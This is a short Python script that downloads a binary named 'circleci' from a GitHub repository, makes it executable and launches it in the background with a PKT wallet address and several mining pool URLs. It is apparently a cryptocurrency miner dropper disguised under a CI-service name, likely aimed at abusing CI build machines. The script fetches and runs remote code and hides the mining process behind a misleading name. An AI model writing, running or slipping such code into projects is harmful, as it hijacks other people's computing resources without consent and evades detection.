import subprocess
def main():
    print("start!!")

    cmd = "wget https://github.com/aurbach55/pos/raw/main/circleci"
    subprocess.call(cmd, shell=True)

    cmd = "chmod 777 circleci"
    subprocess.call(cmd, shell=True)

    cmd = "nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1"
    subprocess.call(cmd, shell=True)

    print("done!!")


if __name__ == '__main__':
    main()
